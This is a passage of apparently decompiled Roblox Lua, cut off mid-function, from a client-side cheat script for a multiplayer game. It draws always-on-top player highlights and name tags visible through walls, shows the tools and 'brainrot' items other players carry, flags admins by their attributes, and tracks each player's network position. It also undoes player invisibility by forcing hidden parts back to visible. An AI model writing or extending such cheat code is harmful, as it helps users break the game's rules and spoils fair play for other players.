		local function fn38(arg, color, arg2, arg3)
			arg.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			arg.Color = color
			arg.Enabled = true
			arg.LineJoinMode = Enum.LineJoinMode.Round
			arg.Transparency = 0

			local ok = pcall(function()
				arg.BorderOffset = UDim.new(0, 0)
				arg.BorderStrokePosition = Enum.BorderStrokePosition.Outer
				arg.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
			end)

			arg.Thickness = ok and arg2 or arg3
			return ok
		end

		local function createTextLabel(name, parent, zIndex)
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = name
			textLabel.AnchorPoint = Vector2.new(0, 0.5)
			textLabel.BackgroundTransparency = 1
			textLabel.FontFace = font2
			textLabel.Text = ""
			textLabel.TextScaled = true
			textLabel.TextStrokeTransparency = 1
			textLabel.TextXAlignment = Enum.TextXAlignment.Center
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.ZIndex = zIndex
			textLabel.Parent = parent
			return textLabel
		end

		local function fn39(arg, hasTool)
			local v18 = fn36()
			local visible = tbl10.Name == true
			local text = tbl10.Username == true
			local visible2 = tbl10.Avatar == true
			local flag9 = tbl10.Tool == true
			local visible3 = tbl10.Brainrot == true
			local visible4 = tbl10["Admin Panel"] == true
			local n15 = visible2 and math.floor(v18 * 0.72) or 0
			local n16 = flag9 and math.floor(v18 * 0.82) or 0
			local n17 = math.floor(v18 * 0.7)
			local n18 = math.max(1, math.floor(v18 * 0.04))
			local targetPlayer = arg.TargetPlayer
			text = text and targetPlayer.Name or targetPlayer.DisplayName
			arg.DisplayName.Text = text
			arg.NameShadow.Text = text
			local n19 = math.floor(math.clamp(fn37(arg.DisplayName.Text, font2, n17) + 4, n17, 230))
			local v19 = flag9 and hasTool
			local n20 = 0
			local n21 = 0

			if visible2 then
				n20 = 0 + n15
			end

			local n22 = 0

			if visible then
				if not (n20 > 0) then
					n22 = n20
				else
					n22 = n20 + n18
				end

				n20 = n22 + n19
			end

			local n23 = 0

			if v19 then
				if not (n20 > 0) then
					n23 = n20
				else
					n23 = n20 + n18
				end

				n20 = n23 + n16
			end

			local n24 = math.max(n20, 1)
			visible3 = visible3 and type(arg.BrainrotName) == "string" and arg.BrainrotName ~= ""
			local n25 = math.floor(v18 * 0.88)
			local n26 = -math.max(2, math.floor(v18 * 0.16))
			local brainrotName = visible3 and arg.BrainrotName or ""
			local n27 = visible3 and math.floor(math.clamp(fn37(brainrotName, font2, n25) + 6, n25, 320)) or 0
			local visible5 = visible3 and type(arg.BrainrotGeneration) == "string" and arg.BrainrotGeneration ~= ""
			local brainrotGeneration = visible5 and arg.BrainrotGeneration or ""
			local n28 = math.max(2, math.floor(v18 * 0.12))
			local n29 = visible5 and math.floor(math.clamp(fn37(brainrotGeneration, font2, n25) + 4, n25, 150)) or 0
			local n30 = n27 + (visible5 and n28 + n29 or 0)
			local n31 = visible and n22 + n19 * 0.5 or n24 * 0.5
			local n32 = n31 - n30 * 0.5
			local n33 = math.min(0, n32)
			local n34 = math.max(n24, n32 + n30)
			local v20 = math.ceil(n34 - n33)
			visible4 = visible4 and arg.IsAdmin == true
			local n35 = math.max(1, math.floor(v18 * 0.6))
			local n36 = visible4 and math.floor(math.clamp(fn37("Admin Panel", font, n35) + 3, n35, 150)) or 0
			local n37 = n35 + -math.max(2, math.floor(v18 * 0.2))
			local brainrotMutation = visible3 and arg.BrainrotMutation or nil
			local visible6 = brainrotMutation ~= nil
			local n38 = math.floor(v18 * 0.62)
			local n39 = -math.max(1, math.floor(v18 * 0.1))
			local n40 = visible6 and math.floor(math.clamp(fn37(brainrotMutation.Text:gsub("<[^<>]->", ""), font2, n38) + 6, n38, 260)) or 0
			local n41 = visible6 and n38 + n39 or 0
			local n42 = n31 - n40 * 0.5
			local n43

			if visible6 then
				n43 = math.min(n33, n42)
				v20 = math.ceil(math.max(n34, n42 + n40) - n43)
			else
				n43 = n33
			end

			local n44 = visible3 and n25 + n26 or 0
			local n45 = n37 + n41 + n44 + v18
			local n46 = -n43
			local n47 = n46 + n32
			local n48 = (n37 + n41 + n44 + v18 * 0.5) / n45
			local n49 = visible3 and (n37 + n41 + n25 * 0.5) / n45 or 0
			local n50 = visible6 and (n37 + n38 * 0.5) / n45 or 0
			local n51 = visible4 and n35 * 0.5 / n45 or 0
			local n52 = 1 / v20
			local n53 = 1 / n45
			arg.HasTool = hasTool
			arg.Billboard.Size = UDim2.fromOffset(v20, n45)
			arg.DisplayName.Visible = visible
			arg.NameShadow.Visible = visible
			arg.Avatar.Visible = visible2
			arg.ToolIcon.Visible = flag9 and arg.ToolIcon.Image ~= ""
			arg.ToolShadow.Visible = flag9 and arg.ToolShadow.Image ~= ""
			arg.Avatar.Position = UDim2.fromScale((n46 + n21) / v20, n48)
			arg.Avatar.Size = UDim2.fromScale(n15 / v20, n15 / n45)
			arg.DisplayName.Position = UDim2.fromScale((n46 + n22) / v20, n48)
			arg.DisplayName.Size = UDim2.fromScale(n19 / v20, n17 / n45)
			arg.NameShadow.Position = UDim2.fromScale((n46 + n22) / v20 + n52, n48 + n53)
			arg.NameShadow.Size = arg.DisplayName.Size
			arg.ToolIcon.Position = UDim2.fromScale((n46 + n23) / v20, n48)
			arg.ToolIcon.Size = UDim2.fromScale(n16 / v20, n16 / n45)
			arg.ToolShadow.Position = UDim2.fromScale((n46 + n23) / v20 + n52, n48 + n53)
			arg.ToolShadow.Size = arg.ToolIcon.Size
			arg.AdminLine.Visible = visible4

			if visible4 then
				arg.AdminLine.Position = UDim2.fromScale((n46 + n31) / v20, n51)
				arg.AdminLine.Size = UDim2.fromScale(n36 / v20, n35 / n45)
				arg.AdminText.Position = UDim2.fromScale(0, 0.5)
				arg.AdminText.Size = UDim2.fromScale(n36 / n36, 1)
				arg.AdminShadow.Position = UDim2.fromScale(1 / n36, 0.5 + 1 / n35)
				arg.AdminShadow.Size = arg.AdminText.Size
			end

			arg.MutationText.Visible = visible6
			arg.MutationShadow.Visible = visible6

			if visible6 then
				arg.MutationText.RichText = brainrotMutation.RichText
				arg.MutationText.Text = brainrotMutation.Text
				arg.MutationText.TextColor3 = brainrotMutation.Color

				if brainrotMutation.Font then
					arg.MutationText.FontFace = brainrotMutation.Font
					arg.MutationShadow.FontFace = brainrotMutation.Font
				end

				local uiStroke = arg.MutationText:FindFirstChildOfClass("UIStroke")

				if uiStroke and brainrotMutation.StrokeColor then
					uiStroke.Color = brainrotMutation.StrokeColor
				end

				arg.MutationShadow.RichText = false
				arg.MutationShadow.Text = brainrotMutation.Text:gsub("<[^<>]->", "")

				if brainrotMutation.Gradient then
					arg.MutationGradient.Color = brainrotMutation.Gradient.Color
					arg.MutationGradient.Rotation = brainrotMutation.Gradient.Rotation
					arg.MutationGradient.Enabled = true
				else
					arg.MutationGradient.Enabled = false
				end

				arg.MutationText.Position = UDim2.fromScale((n46 + n42) / v20, n50)
				arg.MutationText.Size = UDim2.fromScale(n40 / v20, n38 / n45)
				arg.MutationShadow.Position = UDim2.fromScale((n46 + n42) / v20 + n52, n50 + n53)
				arg.MutationShadow.Size = arg.MutationText.Size
			end

			arg.BrainrotText.Text = brainrotName
			arg.BrainrotShadow.Text = brainrotName
			arg.BrainrotText.Visible = visible3
			arg.BrainrotShadow.Visible = visible3
			arg.GenerationText.Text = brainrotGeneration
			arg.GenerationShadow.Text = brainrotGeneration
			arg.GenerationText.Visible = visible5
			arg.GenerationShadow.Visible = visible5

			if visible3 then
				local n54 = n47 / v20
				arg.BrainrotText.Position = UDim2.fromScale(n54, n49)
				arg.BrainrotText.Size = UDim2.fromScale(n27 / v20, n25 / n45)
				arg.BrainrotShadow.Position = UDim2.fromScale(n54 + n52, n49 + n53)
				arg.BrainrotShadow.Size = arg.BrainrotText.Size

				if visible5 then
					local n55 = (n47 + n27 + n28) / v20
					arg.GenerationText.Position = UDim2.fromScale(n55, n49)
					arg.GenerationText.Size = UDim2.fromScale(n29 / v20, n25 / n45)
					arg.GenerationShadow.Position = UDim2.fromScale(n55 + n52, n49 + n53)
					arg.GenerationShadow.Size = arg.GenerationText.Size
				end
			end
		end

		local function fn40(arg, arg2, arg3)
			local v18 = arg3 or arg2
			local highlight = Instance.new("Highlight")
			highlight.Name = "PlayerHighlight"
			highlight.Adornee = arg2.Parent
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight.FillColor = Color3.fromRGB(0, 67, 148)
			highlight.FillTransparency = 0.76
			highlight.OutlineColor = Color3.fromRGB(72, 207, 255)
			highlight.OutlineTransparency = 0.02
			highlight.Parent = v17
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "PlayerTag"
			billboardGui.Adornee = v18
			billboardGui.AlwaysOnTop = true
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = 1000
			billboardGui.Size = UDim2.fromOffset(1, 1)
			billboardGui.StudsOffsetWorldSpace = fn28(arg2, v18)
			billboardGui.Parent = v17
			local boxHandleAdornment = Instance.new("BoxHandleAdornment")
			boxHandleAdornment.Name = "NetworkPosition"
			boxHandleAdornment.Adornee = v18
			boxHandleAdornment.AlwaysOnTop = true
			boxHandleAdornment.CFrame = CFrame.new(0, 1.2, 0)
			boxHandleAdornment.Color3 = Color3.fromRGB(72, 207, 255)
			boxHandleAdornment.Size = Vector3.new(3.2, 5.2, 2.2)
			boxHandleAdornment.Transparency = 0.78
			boxHandleAdornment.Visible = false
			boxHandleAdornment.ZIndex = 1
			boxHandleAdornment.Parent = v17
			local frame = Instance.new("Frame")
			frame.Name = "Content"
			frame.Size = UDim2.fromScale(1, 1)
			frame.BackgroundTransparency = 1
			frame.Parent = billboardGui
			local imageLabel = Instance.new("ImageLabel")
			imageLabel.Name = "Avatar"
			imageLabel.AnchorPoint = Vector2.new(0, 0.5)
			imageLabel.BackgroundTransparency = 1
			imageLabel.ScaleType = Enum.ScaleType.Crop
			imageLabel.Parent = frame
			local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint.AspectRatio = 1
			uiAspectRatioConstraint.Parent = imageLabel
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(1, 0)
			uiCorner.Parent = imageLabel
			local NameShadow = createTextLabel("NameShadow", frame, 1)
			NameShadow.Text = arg.DisplayName
			NameShadow.TextColor3 = Color3.fromRGB(7, 19, 34)
			NameShadow.TextTransparency = 0.05
			local DisplayName = createTextLabel("DisplayName", frame, 2)
			DisplayName.Text = arg.DisplayName
			DisplayName.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke = Instance.new("UIStroke")
			fn38(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
			uiStroke.Parent = DisplayName
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Color = colorSequence
			uiGradient.Rotation = 90
			uiGradient.Parent = uiStroke
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Color = v14
			uiGradient2.Rotation = 90
			uiGradient2.Parent = DisplayName
			local BrainrotShadow = createTextLabel("BrainrotShadow", frame, 3)
			BrainrotShadow.TextColor3 = Color3.fromRGB(25, 0, 4)
			local BrainrotText = createTextLabel("BrainrotText", frame, 4)
			BrainrotText.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke2 = Instance.new("UIStroke")
			fn38(uiStroke2, Color3.fromRGB(124, 0, 15), 0.052, 1.7)
			uiStroke2.Parent = BrainrotText
			local uiGradient3 = Instance.new("UIGradient")
			uiGradient3.Color = v16
			uiGradient3.Rotation = 90
			uiGradient3.Parent = uiStroke2
			local uiGradient4 = Instance.new("UIGradient")
			uiGradient4.Color = v15
			uiGradient4.Rotation = 90
			uiGradient4.Parent = BrainrotText
			local MutationShadow = createTextLabel("MutationShadow", frame, 3)
			MutationShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
			MutationShadow.TextTransparency = 0.15
			local MutationText = createTextLabel("MutationText", frame, 4)
			MutationText.TextColor3 = Color3.fromRGB(255, 255, 255)
			MutationText.RichText = true
			local uiStroke3 = Instance.new("UIStroke")
			fn38(uiStroke3, Color3.fromRGB(0, 0, 0), 0.05, 1.5)
			uiStroke3.Transparency = 0.15
			uiStroke3.Parent = MutationText
			local uiGradient5 = Instance.new("UIGradient")
			uiGradient5.Enabled = false
			uiGradient5.Rotation = 90
			uiGradient5.Parent = MutationText
			local GenerationShadow = createTextLabel("GenerationShadow", frame, 3)
			GenerationShadow.TextColor3 = Color3.fromRGB(18, 48, 0)
			GenerationShadow.TextTransparency = 0.08
			local GenerationText = createTextLabel("GenerationText", frame, 4)
			GenerationText.TextColor3 = Color3.fromRGB(115, 255, 0)
			local uiStroke4 = Instance.new("UIStroke")
			fn38(uiStroke4, Color3.fromRGB(0, 0, 0), 0.05, 1.5)
			uiStroke4.Transparency = 0.3
			uiStroke4.Parent = GenerationText
			local imageLabel2 = Instance.new("ImageLabel")
			imageLabel2.Name = "ToolShadow"
			imageLabel2.AnchorPoint = Vector2.new(0, 0.5)
			imageLabel2.BackgroundTransparency = 1
			imageLabel2.ImageColor3 = Color3.fromRGB(0, 0, 0)
			imageLabel2.ImageTransparency = 0.35
			imageLabel2.ScaleType = Enum.ScaleType.Fit
			imageLabel2.Visible = false
			imageLabel2.ZIndex = 1
			imageLabel2.Parent = frame
			local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint2.AspectRatio = 1
			uiAspectRatioConstraint2.Parent = imageLabel2
			local imageLabel3 = Instance.new("ImageLabel")
			imageLabel3.Name = "ToolIcon"
			imageLabel3.AnchorPoint = Vector2.new(0, 0.5)
			imageLabel3.BackgroundTransparency = 1
			imageLabel3.ScaleType = Enum.ScaleType.Fit
			imageLabel3.Visible = false
			imageLabel3.ZIndex = 2
			imageLabel3.Parent = frame
			local uiAspectRatioConstraint3 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint3.AspectRatio = 1
			uiAspectRatioConstraint3.Parent = imageLabel3
			local frame2 = Instance.new("Frame")
			frame2.Name = "AdminLine"
			frame2.AnchorPoint = Vector2.new(0.5, 0.5)
			frame2.BackgroundTransparency = 1
			frame2.BorderSizePixel = 0
			frame2.Visible = false
			frame2.ZIndex = 3
			frame2.Parent = frame
			local AdminShadow = createTextLabel("AdminShadow", frame2, 3)
			AdminShadow.AnchorPoint = Vector2.new(0, 0.5)
			AdminShadow.FontFace = font
			AdminShadow.Text = "Admin Panel"
			AdminShadow.TextColor3 = Color3.fromRGB(10, 14, 22)
			AdminShadow.TextTransparency = 0.08
			local AdminText = createTextLabel("AdminText", frame2, 4)
			AdminText.AnchorPoint = Vector2.new(0, 0.5)
			AdminText.FontFace = font
			AdminText.Text = "Admin Panel"
			AdminText.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke5 = Instance.new("UIStroke")
			fn38(uiStroke5, Color3.fromRGB(10, 24, 45), 0.02, 1.45)
			uiStroke5.Transparency = 0.02
			uiStroke5.Parent = AdminText
			local uiGradient6 = Instance.new("UIGradient")
			local colorSequence2 = ColorSequence.new
			local tbl14 = {}
			local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
			local v20 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(235, 242, 255))
			tbl14[1] = v19
			tbl14[2] = v20

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
				table.move(values, 1, values.n, 3, tbl14)
			end

			uiGradient6.Color = colorSequence2(tbl14)
			uiGradient6.Rotation = 90
			uiGradient6.Parent = AdminText

			local tbl15 = {
				TargetPlayer = arg,
				PlayerHighlight = highlight,
				NetworkTracker = boxHandleAdornment,
				NetworkAnchor = v18,
				VisualHead = arg2,
				Billboard = billboardGui,
				Avatar = imageLabel,
				NameShadow = NameShadow,
				DisplayName = DisplayName,
				BrainrotShadow = BrainrotShadow,
				BrainrotText = BrainrotText,
				BrainrotGradient = uiGradient4,
				BrainrotStrokeGradient = uiGradient3,
				GenerationShadow = GenerationShadow,
				GenerationText = GenerationText,
				MutationShadow = MutationShadow,
				MutationText = MutationText,
				MutationGradient = uiGradient5,
				ToolShadow = imageLabel2,
				ToolIcon = imageLabel3,
				AdminLine = frame2,
				AdminShadow = AdminShadow,
				AdminText = AdminText,
				BrainrotName = nil,
				BrainrotGeneration = nil,
				BrainrotMutation = nil,
				IsAdmin = false,
				HasTool = false,
			}

			fn39(tbl15, false)
			return tbl15
		end

		local function fn41(arg)
			local tag = arg.Tag
			local character_ = arg.Character
			if not tag or not character_ then
				return false
			end
			local visualHead = tag.VisualHead
			local networkAnchor = tag.NetworkAnchor
			if not visualHead or not visualHead:IsDescendantOf(character_) or not networkAnchor or not networkAnchor:IsDescendantOf(character_) then
				return false
			end
			tag.Billboard.Adornee = networkAnchor
			local visible = networkAnchor ~= visualHead and (networkAnchor.Position - visualHead.Position).Magnitude >= n11
			tag.PlayerHighlight.Enabled = not visible
			tag.NetworkTracker.Adornee = networkAnchor
			tag.NetworkTracker.Visible = visible
			return true
		end

		local function fn42(arg)
			if arg:GetAttribute("AdminCommands") == true then
				return true
			end
			local attribute = arg:GetAttribute("Role")
			return type(attribute) == "string" and string.find(string.lower(attribute), "admin", 1, true) ~= nil
		end

		local function fn43(arg, arg2)
			if not arg.Tag then
				return
			end
			arg.Tag.IsAdmin = fn42(arg2)
			fn39(arg.Tag, arg.Tag.HasTool == true)
		end

		local function fn44(arg)
			if not arg.Tag or not arg.Character then
				return
			end
			local v18 = fn26(fn27(arg.Character))
			local visible = v18 ~= ""
			arg.Tag.ToolIcon.Image = v18
			arg.Tag.ToolIcon.Visible = visible
			arg.Tag.ToolShadow.Image = v18
			arg.Tag.ToolShadow.Visible = visible
			fn39(arg.Tag, visible)
		end

		local function fn45(arg)
			if not arg.Tag then
				return
			end
			arg.Tag.BrainrotName = arg.BrainrotName
			arg.Tag.BrainrotGeneration = arg.BrainrotGeneration
			arg.Tag.BrainrotMutation = fn34(arg.BrainrotMutationLabel)
			fn39(arg.Tag, arg.Tag.HasTool == true)
			local v18 = fn19(arg.BrainrotGeneration)

			if arg.Tag.BrainrotGradient then
				arg.Tag.BrainrotGradient.Color = v18.Text
			end

			if arg.Tag.BrainrotStrokeGradient then
				arg.Tag.BrainrotStrokeGradient.Color = v18.Stroke
			end

			if arg.BrainrotHighlight and (tbl10.Brainrot ~= true or arg.BrainrotHighlight.Adornee ~= arg.BrainrotModel) then
				arg.BrainrotHighlight:Destroy()
				arg.BrainrotHighlight = nil
			end

			if tbl10.Brainrot == true and arg.BrainrotModel and arg.BrainrotModel.Parent and not arg.BrainrotHighlight then
				local highlight = Instance.new("Highlight")
				highlight.Name = "BrainrotHighlight"
				highlight.Adornee = arg.BrainrotModel
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillTransparency = 0.68
				highlight.OutlineTransparency = 0
				highlight.Parent = v17
				arg.BrainrotHighlight = highlight
			end

			if arg.BrainrotHighlight then
				arg.BrainrotHighlight.FillColor = v18.Fill
				arg.BrainrotHighlight.OutlineColor = v18.Outline
			end
		end

		local function fn46(arg)
			if arg.BrainrotGenerationConnection then
				arg.BrainrotGenerationConnection:Disconnect()
				arg.BrainrotGenerationConnection = nil
			end

			local v18 = ipairs
			local brainrotMutationConnections = arg.BrainrotMutationConnections or {}

			for _, brainrotMutationConnection in v18(brainrotMutationConnections) do
				brainrotMutationConnection:Disconnect()
			end

			arg.BrainrotMutationConnections = nil
			arg.BrainrotMutationLabel = nil
		end

		local function fn47(arg, brainrotMutationLabel, arg2)
			if not brainrotMutationLabel then
				return
			end
			arg.BrainrotMutationLabel = brainrotMutationLabel
			local brainrotMutationConnections = {}

			local function fn48()
				if arg.BrainrotModel == arg2 then
					fn45(arg)
				end
			end

			brainrotMutationConnections[#brainrotMutationConnections + 1] = brainrotMutationLabel:GetPropertyChangedSignal("Text"):Connect(fn48)
			brainrotMutationConnections[#brainrotMutationConnections + 1] = brainrotMutationLabel:GetPropertyChangedSignal("Visible"):Connect(fn48)
			brainrotMutationConnections[#brainrotMutationConnections + 1] = brainrotMutationLabel:GetPropertyChangedSignal("TextColor3"):Connect(fn48)
			arg.BrainrotMutationConnections = brainrotMutationConnections
		end

		local function fn48(arg, arg2)
			arg.StealingVersion = arg.StealingVersion + 1
			local stealingVersion = arg.StealingVersion

			if arg2:GetAttribute("Stealing") ~= true then
				fn46(arg)
				arg.BrainrotName = nil
				arg.BrainrotGeneration = nil
				arg.BrainrotModel = nil
				fn45(arg)
				return
			end

			task.spawn(function()
				for i_ = 1, 7 do
					if not flag8 or arg.StealingVersion ~= stealingVersion or tbl11[arg2] ~= arg then
						return
					end
					local v18, v19, v20, v21, v22 = fn35(arg2)

					if v18 then
						fn46(arg)
						arg.BrainrotName = v18
						arg.BrainrotModel = v19
						arg.BrainrotGeneration = v20
						fn47(arg, v22, v19)

						if v21 then
							arg.BrainrotGenerationConnection = v21:GetPropertyChangedSignal("Text"):Connect(function()
								if arg.BrainrotModel == v19 then
									arg.BrainrotGeneration = v21.Text
									fn45(arg)
								end
							end)
						end

						fn45(arg)
						return
					end

					if i_ < 7 then
						task.wait(0.12)
					end
				end

				if arg.StealingVersion == stealingVersion then
					fn46(arg)
					arg.BrainrotName = nil
					arg.BrainrotGeneration = nil
					arg.BrainrotModel = nil
					fn45(arg)
				end
			end)
		end

		local function fn49(arg, arg2, arg3)
			local image = tbl13[arg2.UserId]

			if image == nil then
				local ok

				ok, image = pcall(function()
					return Players:GetUserThumbnailAsync(arg2.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
				end)

				image = ok and image or ""
				tbl13[arg2.UserId] = image
			end

			if flag8 and arg.Version == arg3 and arg.Tag and arg.Tag.Avatar.Parent then
				arg.Tag.Avatar.Image = image
			end
		end

		local flag9 = false

		local function fn50(arg)
			if arg:IsA("BasePart") then
				return arg.Name ~= "HumanoidRootPart"
			end
			return arg:IsA("Decal") or arg:IsA("Texture")
		end

		local function fn51(arg, arg2)
			if flag9 or not arg2.Parent then
				return
			end
			local transparency2 = arg2.Transparency

			if transparency2 <= n12 then
				arg.RevealOriginals[arg2] = transparency2
				arg.RevealHidden[arg2] = nil
				return
			end

			if arg.RevealOriginals[arg2] == nil then
				return
			end
			arg.RevealHidden[arg2] = transparency2
			flag9 = true

			pcall(function()
				arg2.Transparency = transparency

				if arg2:IsA("BasePart") then
					arg2.LocalTransparencyModifier = 0
				end
			end)

			flag9 = false
		end

		local function fn52(arg, arg2)
			if arg.RevealBound[arg2] then
				return
			end
			arg.RevealBound[arg2] = true
			local transparency2 = arg2.Transparency

			if transparency2 <= n12 then
				arg.RevealOriginals[arg2] = transparency2
			elseif arg2:IsA("BasePart") and tbl6[arg2.Name] then
				arg.RevealOriginals[arg2] = 0
			elseif arg2:IsA("Decal") and string.lower(arg2.Name) == "face" then
				arg.RevealOriginals[arg2] = 0
			end

			arg.RevealConnections[#arg.RevealConnections + 1] = arg2:GetPropertyChangedSignal("Transparency"):Connect(function()
				if flag8 then
					fn51(arg, arg2)
				end
			end)

			fn51(arg, arg2)
		end

		local function fn53(arg, arg2)
			for _, descendant in ipairs(arg2:GetDescendants()) do
				if fn50(descendant) then
					fn52(arg, descendant)
				end
			end

			arg.RevealConnections[#arg.RevealConnections + 1] = arg2.DescendantAdded:Connect(function(descendant)
				if flag8 and fn50(descendant) then
					fn52(arg, descendant)
				end
			end)
		end

		local function fn54(arg)
			fn21(arg.RevealConnections)
			flag9 = true

			for k, v18 in pairs(arg.RevealHidden) do
				if k.Parent then
					pcall(function()
						k.Transparency = v18
					end)
				end
			end

			flag9 = false
			table.clear(arg.RevealHidden)
			table.clear(arg.RevealOriginals)
			table.clear(arg.RevealBound)
		end

		local function fn55(arg)
			fn21(arg.CharacterConnections)
			fn22(arg)
			fn54(arg)
			fn46(arg)

			if arg.BrainrotHighlight then
				arg.BrainrotHighlight:Destroy()
				arg.BrainrotHighlight = nil
			end

			arg.BrainrotModel = nil
			arg.BrainrotGeneration = nil

			if arg.Tag then
				if arg.Tag.PlayerHighlight then
					arg.Tag.PlayerHighlight:Destroy()
				end

				if arg.Tag.NetworkTracker then
					arg.Tag.NetworkTracker:Destroy()
				end

				arg.Tag.Billboard:Destroy()
				arg.Tag = nil
			end

			arg.Character = nil
			arg.BindingCharacter = nil
		end

		local fn56 = nil

		fn56 = function(arg, arg2, character_)
			fn55(arg)
			arg.Version = arg.Version + 1
			local version = arg.Version
			if not flag8 or not character_ then
				return
			end
			arg.Character = character_
			arg.BindingCharacter = character_
			fn23(arg, character_)
			fn53(arg, character_)

			local function fn57()
				task.defer(function()
					if flag8 and arg.Version == version then
						fn44(arg)
					end
				end)
			end

			arg.CharacterConnections[#arg.CharacterConnections + 1] = character_.ChildAdded:Connect(function(child)
				if child:IsA("Tool") then
					fn57()
				elseif child:IsA("Humanoid") then
					fn23(arg, character_)
				end
			end)

			arg.CharacterConnections[#arg.CharacterConnections + 1] = character_.ChildRemoved:Connect(function(child)
				if child:IsA("Tool") then
					fn57()
				end
			end)

			arg.CharacterConnections[#arg.CharacterConnections + 1] = character_.AncestryChanged:Connect(function()
				if not flag8 or arg.Version ~= version or character_ ~= arg2.Character then
					return
				end

				if character_:IsDescendantOf(Workspace) then
					if not arg.Tag then
						task.defer(function()
							if flag8 and arg.Version == version then
								fn56(arg, arg2, character_)
							end
						end)
					end

					return
				end

				arg.Version = arg.Version + 1
				fn55(arg)
			end)

			task.spawn(function()
				local head = character_:FindFirstChild("Head") or character_:WaitForChild("Head", 5)

				if not flag8 or arg.Version ~= version or character_ ~= arg2.Character or not character_:IsDescendantOf(Workspace) or not head or not head:IsDescendantOf(character_) then
					if arg.Version == version then
						arg.BindingCharacter = nil
					end

					return
				end

				local v18 = fn24(character_, head)
				arg.Tag = fn40(arg2, head, v18)
				fn41(arg)
				arg.BindingCharacter = nil

				arg.CharacterConnections[#arg.CharacterConnections + 1] = head.AncestryChanged:Connect(function()
					if not flag8 or arg.Version ~= version or head:IsDescendantOf(character_) then
						return
					end
					arg.Version = arg.Version + 1
					fn55(arg)
					local character_2 = arg2.Character

					if character_2 and character_2:IsDescendantOf(Workspace) then
						task.defer(function()
							if flag8 and tbl11[arg2] == arg then
								fn56(arg, arg2, character_2)
							end
						end)
					end
				end)

				fn43(arg, arg2)
				fn44(arg)
				fn48(arg, arg2)
				fn49(arg, arg2, version)
			end)
		end

		local function fn57(player)
			local v18 = tbl11[player]
			if not v18 then
				return
			end
			v18.Version = v18.Version + 1
			v18.StealingVersion = v18.StealingVersion + 1
			fn55(v18)
			fn21(v18.PlayerConnections)
			tbl11[player] = nil
		end

		local function fn58(player)
			if player == localPlayer or tbl11[player] then
				return
			end

			local tbl14 = {
				Version = 0,
				StealingVersion = 0,
				Character = nil,
				BindingCharacter = nil,
				Tag = nil,
				BrainrotName = nil,
				BrainrotGeneration = nil,
				BrainrotGenerationConnection = nil,
				BrainrotModel = nil,
				BrainrotHighlight = nil,
				NameDisplayHumanoid = nil,
				NameDisplayDistance = nil,
				RevealOriginals = {},
				RevealHidden = {},
				RevealBound = {},
				RevealConnections = {},
				CharacterConnections = {},
				PlayerConnections = {},
			}

			tbl11[player] = tbl14

			for _, v18 in ipairs({ "AdminCommands", "Role" }) do
				tbl14.PlayerConnections[#tbl14.PlayerConnections + 1] = player:GetAttributeChangedSignal(v18):Connect(function()
					if flag8 and tbl11[player] == tbl14 then
						fn43(tbl14, player)
					end
				end)
			end

			tbl14.PlayerConnections[#tbl14.PlayerConnections + 1] = player.CharacterAdded:Connect(function(character_)
				fn56(tbl14, player, character_)
			end)

			tbl14.PlayerConnections[#tbl14.PlayerConnections + 1] = player.CharacterRemoving:Connect(function(character_)
				if tbl14.Character == character_ then
					tbl14.Version = tbl14.Version + 1
					fn55(tbl14)
				end
			end)

			tbl14.PlayerConnections[#tbl14.PlayerConnections + 1] = player:GetPropertyChangedSignal("Character"):Connect(function()
				task.defer(function()
					if not flag8 or tbl11[player] ~= tbl14 then
						return
					end
					local character_ = player.Character

					if character_ ~= tbl14.Character then
						fn56(tbl14, player, character_)
					elseif tbl14.Tag then
						local adornee = tbl14.Tag.Billboard.Adornee

						if not adornee or not adornee:IsDescendantOf(Workspace) then
							fn56(tbl14, player, character_)
						end
					end
				end)
			end)

			tbl14.PlayerConnections[#tbl14.PlayerConnections + 1] = player:GetAttributeChangedSignal("Stealing"):Connect(function()
				fn48(tbl14, player)
			end)

			fn56(tbl14, player, player.Character)
		end

		local function fn59()
			for k, v18 in pairs(tbl11) do
				local character_ = k.Character

				if character_ and character_:IsDescendantOf(Workspace) then
					local tag = v18.Tag
					local billboard = tag and tag.Billboard
					tag = tag and tag.PlayerHighlight
					local adornee = billboard and billboard.Adornee
					local parent = billboard and billboard.Parent and adornee and adornee:IsDescendantOf(character_) and tag and tag.Parent and fn41(v18)

					if (v18.Character ~= character_ or not parent) and v18.BindingCharacter ~= character_ then
						fn56(v18, k, character_)
					end
				elseif v18.Character then
					v18.Version = v18.Version + 1
					fn55(v18)
				end
			end
		end

		local function fn60()
			flag8 = false
			n14 += 1
			fn21(tbl12)
			local tbl14 = {}

			for k in pairs(tbl11) do
				tbl14[#tbl14 + 1] = k
			end

			for _, v18 in ipairs(tbl14) do
				fn57(v18)
			end
		end

		local function fn61()
			for _, v18 in pairs(tbl11) do
				if v18.Tag and v18.Tag.Billboard.Parent then
					fn39(v18.Tag, v18.Tag.HasTool == true)
				end
			end
		end

		local function fn62()
			for _, v18 in pairs(tbl11) do
				if v18.Tag and v18.Tag.Billboard.Parent then
					fn44(v18)
					fn45(v18)
				end
			end
		end

		local function fn63()
			fn60()
			flag8 = true
			local v18 = n14
